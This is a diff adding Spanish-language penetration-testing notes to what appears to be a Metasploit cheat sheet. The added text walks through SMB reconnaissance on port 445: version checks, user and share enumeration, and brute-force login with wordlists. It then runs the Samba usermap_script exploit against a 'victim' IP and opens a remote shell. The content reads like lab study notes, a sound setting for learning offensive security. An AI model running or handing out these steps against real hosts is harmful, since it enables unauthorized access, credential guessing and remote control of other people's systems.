@@ -140,3 +140,78 @@ Non-Stage               # Sends exploit shellcode all at once. Larger in size an
 Staged                  # Sends payload in stages. Can be less stable -> **windows/meterpreter/reverse_tcp**
 ```
 
+## Puerto 445 'Reconocimiento'
+
+```bash 
+# Miramos la version del SMB
+❯ msfconsole -q                  # q = Quitar el banner de inicio
+
+	❯ search smb                                  # Buscamos el exploit
+	❯ use auxiliary/scanner/smb/smb_version       # Usamos el auxiliar 
+	❯ options
+	❯ set RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
+	❯ run 
+```
+
+```bash 
+# Para saber si soporta SMB2
+❯ msfconsole -q                                    # q = Quitar el banner de inicio
+
+	❯ use auxiliary/scanner/smb/smb2              # Usamos el auxiliar
+	❯ options
+	❯ set RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
+	❯ run 
+```
+
+```bash 
+# Para enumerar los usuarios que existen en el SMB
+❯ msfconsole -q                                    # q = Quitar el banner de inicio
+
+	❯ use auxiliary/scanner/smb/smb_enumusers     # Usamos el auxiliar
+	❯ options
+	❯ set RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
+	❯ run 
+```
+
+```bash 
+# Para enumerar los directorios que existen en el SMB
+❯ msfconsole -q                                    # q = Quitar el banner de inicio
+
+	❯ use auxiliary/scanner/smb/smb_enumshares    # Usamos el auxiliar
+	❯ options
+	❯ set RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
+	❯ run 
+```
+
+```bash 
+# Enumerar usuarios y passwds con un diccionario de Fuerza Bruta
+❯ msfconsole -q                                               # q = Quitar el banner de inicio
+
+	❯ use auxiliary/scanner/smb/smb_login                    # Usamos el auxiliar
+	❯ options
+	❯ set RHOSTS 192.168.1.194                               # Colocamos la IP de la maquina victima
+	❯ set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix-users.txt 
+	❯ set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt
+	❯ set VERBOSE false
+	❯ run 
+
+	❯ set smbuser <user>                                # si ya tenemos a un usuario enumerado lo podemos colocar con ese comando
+
+# Diccionarios 
+/usr/share/wordlists/metasploit/unix_passwords.txt
+```
+
+## Puerto 445 'Exploit'
+
+```bash 
+# Algunas versiones con exploit (3.0.20)
+❯ msfconsole -q                  # q = Quitar el banner de inicio
+
+	❯ search samba 
+	❯ use exploit/multi/samba/usermap_script       # Usamos el exploit
+	❯ options
+	❯ set RHOSTS 192.168.1.194                     # Colocamos la IP de la maquina victima
+	❯ set LHOSTS 192.168.1.157                     # Colocamos la IP de nuestra maquina 
+	❯ run 
+	❯ shell 
+```
